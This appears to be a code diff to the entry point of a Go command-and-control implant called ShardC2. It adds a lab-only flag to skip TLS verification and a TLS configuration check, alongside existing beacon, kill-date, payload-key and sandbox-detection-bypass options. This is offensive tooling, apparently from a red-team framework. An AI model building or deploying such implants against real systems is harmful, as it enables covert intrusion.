@@ -24,16 +24,17 @@ var (
 
 func main() {
 	var (
-		serverURL  = flag.String("server", envOrDefault("SHARDC2_SERVER", buildServerURL), "C2 server URL")
-		implantKey = flag.String("implant-key", envOrDefault("SHARDC2_IMPLANT_KEY", buildImplantKey), "Implant authentication key")
-		payloadKey = flag.String("payload-key", envOrDefault("SHARDC2_PAYLOAD_KEY", buildPayloadKey), "Payload encryption key (hex)")
-		killDate   = flag.String("kill-date", envOrDefault("SHARDC2_KILL_DATE", buildKillDate), "Agent kill date (RFC3339)")
-		caCert     = flag.String("ca-cert", "", "CA certificate for TLS verification")
-		interval   = flag.Duration("interval", 5*time.Minute, "Beacon interval")
-		jitter     = flag.Duration("jitter", 60*time.Second, "Max beacon jitter")
-		daemon         = flag.Bool("daemon", false, "Run in daemon mode (suppress banner)")
-		ignoreSandbox  = flag.Bool("ignore-sandbox", false, "Skip sandbox detection checks")
-		profileName    = flag.String("profile", "default", "Malleable C2 profile name")
+		serverURL     = flag.String("server", envOrDefault("SHARDC2_SERVER", buildServerURL), "C2 server URL")
+		implantKey    = flag.String("implant-key", envOrDefault("SHARDC2_IMPLANT_KEY", buildImplantKey), "Implant authentication key")
+		payloadKey    = flag.String("payload-key", envOrDefault("SHARDC2_PAYLOAD_KEY", buildPayloadKey), "Payload encryption key (hex)")
+		killDate      = flag.String("kill-date", envOrDefault("SHARDC2_KILL_DATE", buildKillDate), "Agent kill date (RFC3339)")
+		caCert        = flag.String("ca-cert", "", "CA certificate for TLS verification")
+		interval      = flag.Duration("interval", 5*time.Minute, "Beacon interval")
+		jitter        = flag.Duration("jitter", 60*time.Second, "Max beacon jitter")
+		insecureTLS   = flag.Bool("insecure-tls-for-lab-only", false, "Skip TLS verification (lab environments only)")
+		daemon        = flag.Bool("daemon", false, "Run in daemon mode (suppress banner)")
+		ignoreSandbox = flag.Bool("ignore-sandbox", false, "Skip sandbox detection checks")
+		profileName   = flag.String("profile", "default", "Malleable C2 profile name")
 	)
 	flag.Parse()
 
@@ -80,14 +81,19 @@ func main() {
 	}
 
 	cfg := agent.Config{
-		ServerURL:  *serverURL,
-		ImplantKey: *implantKey,
-		PayloadKey: payloadKeyBytes,
-		CACert:     *caCert,
-		Interval:   *interval,
-		Jitter:     *jitter,
-		KillDate:   kd,
-		Profile:    profile,
+		ServerURL:         *serverURL,
+		ImplantKey:        *implantKey,
+		PayloadKey:        payloadKeyBytes,
+		CACert:            *caCert,
+		InsecureTLSForLab: *insecureTLS,
+		Interval:          *interval,
+		Jitter:            *jitter,
+		KillDate:          kd,
+		Profile:           profile,
+	}
+
+	if err := agent.ValidateTLSConfig(cfg); err != nil {
+		log.Fatalf("[-] TLS configuration error: %v", err)
 	}
 
 	ctx, cancel := context.WithCancel(context.Background())
